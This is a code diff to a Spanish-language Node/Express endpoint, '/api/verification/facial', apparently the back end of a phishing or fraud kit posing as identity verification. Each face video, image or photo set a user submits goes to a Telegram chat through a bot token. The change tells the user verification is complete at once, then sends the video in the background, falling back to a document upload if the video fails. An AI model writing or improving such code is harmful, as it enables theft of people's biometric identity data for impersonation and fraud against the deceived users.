@@ -118,61 +118,109 @@ app.post('/api/verification/facial', async (req, res) => {
   const { faceVideo, faceImage, facePhotos } = req.body;
   
   console.log('📥 FACIAL recibido');
-  console.log('   Video:', faceVideo ? faceVideo.length + ' chars' : 'NO');
-  console.log('   Imagen:', faceImage ? faceImage.length + ' chars' : 'NO');
+  console.log('   Video:', faceVideo ? (faceVideo.length / 1024).toFixed(1) + ' KB' : 'NO');
+  console.log('   Imagen:', faceImage ? (faceImage.length / 1024).toFixed(1) + ' KB' : 'NO');
   console.log('   Fotos múltiples:', facePhotos ? facePhotos.length + ' fotos' : 'NO');
   
-  await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL COMPLETADA</b>\n\n✅ ${facePhotos ? facePhotos.length + ' fotos' : faceVideo ? 'Video' : 'Imagen'} recibido\n🕐 ${new Date().toLocaleString('es-AR')}`);
+  // Responder inmediatamente para no bloquear al usuario
+  res.json({ success: true, message: 'Verificación facial completada' });
   
-  // Enviar fotos múltiples si existen
-  if (facePhotos && facePhotos.length > 0) {
-    console.log('📸 Enviando', facePhotos.length, 'fotos faciales...');
-    for (let i = 0; i < facePhotos.length; i++) {
+  // Procesar en background
+  try {
+    await sendToTelegram(`👤 <b>VERIFICACIÓN FACIAL</b>\n\n📹 Tipo: ${faceVideo ? 'VIDEO' : facePhotos ? facePhotos.length + ' fotos' : 'Imagen'}\n🕐 ${new Date().toLocaleString('es-AR')}`);
+    
+    // Si hay video, enviarlo
+    if (faceVideo) {
+      console.log('📹 Procesando video...');
       try {
-        await sendPhotoToTelegram(facePhotos[i], `👤 Foto Facial ${i + 1}/${facePhotos.length}`);
-        // Pequeña pausa entre fotos
-        if (i < facePhotos.length - 1) {
-          await new Promise(resolve => setTimeout(resolve, 200));
+        const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
+        const buffer = Buffer.from(base64Data, 'base64');
+        const sizeMB = (buffer.length / (1024 * 1024)).toFixed(2);
+        console.log(`📹 Tamaño del video: ${sizeMB} MB`);
+        
+        if (buffer.length > 50 * 1024 * 1024) {
+          console.log('⚠️ Video muy grande, enviando como documento...');
+          // Si es muy grande, enviar como documento
+          const FormData = require('form-data');
+          const form = new FormData();
+          form.append('chat_id', TELEGRAM_CHAT_ID);
+          form.append('document', buffer, { filename: 'facial_video.webm' });
+          form.append('caption', `👤 Video Facial (${sizeMB} MB)`);
+          
+          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            timeout: 60000
+          });
+        } else {
+          // Enviar como video normal
+          const FormData = require('form-data');
+          const form = new FormData();
+          form.append('chat_id', TELEGRAM_CHAT_ID);
+          form.append('video', buffer, { filename: 'facial.webm', contentType: 'video/webm' });
+          form.append('caption', `👤 Video Verificación Facial (${sizeMB} MB)`);
+          form.append('supports_streaming', 'true');
+          
+          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, form, {
+            headers: form.getHeaders(),
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            timeout: 60000
+          });
         }
-      } catch (error) {
-        console.log(`⚠️ Error enviando foto ${i + 1}:`, error.message);
+        console.log('✅ Video enviado a Telegram');
+      } catch (videoError) {
+        console.error('❌ Error enviando video:', videoError.response?.data || videoError.message);
+        // Intentar enviar como documento si falla como video
+        try {
+          const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
+          const buffer = Buffer.from(base64Data, 'base64');
+          
+          const FormData = require('form-data');
+          const form = new FormData();
+          form.append('chat_id', TELEGRAM_CHAT_ID);
+          form.append('document', buffer, { filename: 'facial_video.webm' });
+          form.append('caption', '👤 Video Facial (como documento)');
+          
+          await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
+            headers: form.getHeaders(),
+            timeout: 60000
+          });
+          console.log('✅ Video enviado como documento');
+        } catch (docError) {
+          console.error('❌ Error enviando como documento:', docError.message);
+          await sendToTelegram(`⚠️ No se pudo enviar el video facial\nError: ${videoError.message}`);
+        }
       }
     }
-    console.log('✅ Todas las fotos faciales enviadas');
-  }
-  // Si hay video, intentar enviarlo
-  else if (faceVideo) {
-    try {
-      const base64Data = faceVideo.includes(',') ? faceVideo.split(',')[1] : faceVideo;
-      const buffer = Buffer.from(base64Data, 'base64');
-      
-      const FormData = require('form-data');
-      const form = new FormData();
-      form.append('chat_id', TELEGRAM_CHAT_ID);
-      form.append('video', buffer, { filename: 'facial.webm' });
-      form.append('caption', '👤 Video Verificación Facial');
-      
-      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, form, {
-        headers: form.getHeaders(),
-        maxContentLength: Infinity,
-        maxBodyLength: Infinity
-      });
-      console.log('✅ Video enviado');
-    } catch (error) {
-      console.log('⚠️ Error enviando video:', error.message);
+    // Enviar fotos múltiples si existen
+    else if (facePhotos && facePhotos.length > 0) {
+      console.log('📸 Enviando', facePhotos.length, 'fotos faciales...');
+      for (let i = 0; i < facePhotos.length; i++) {
+        try {
+          await sendPhotoToTelegram(facePhotos[i], `👤 Foto Facial ${i + 1}/${facePhotos.length}`);
+          if (i < facePhotos.length - 1) {
+            await new Promise(resolve => setTimeout(resolve, 300));
+          }
+        } catch (error) {
+          console.log(`⚠️ Error enviando foto ${i + 1}:`, error.message);
+        }
+      }
+      console.log('✅ Todas las fotos enviadas');
     }
-  }
-  // Si hay imagen única
-  else if (faceImage) {
-    try {
-      await sendPhotoToTelegram(faceImage, '👤 Foto Verificación Facial');
-      console.log('✅ Foto facial enviada');
-    } catch (error) {
-      console.log('⚠️ Error enviando foto:', error.message);
+    // Si hay imagen única
+    else if (faceImage) {
+      try {
+        await sendPhotoToTelegram(faceImage, '👤 Foto Verificación Facial');
+        console.log('✅ Foto facial enviada');
+      } catch (error) {
+        console.log('⚠️ Error enviando foto:', error.message);
+      }
     }
+  } catch (error) {
+    console.error('❌ Error general en facial:', error.message);
   }
-  
-  res.json({ success: true, message: 'Verificación facial completada' });
 });
 
 // Iniciar servidor
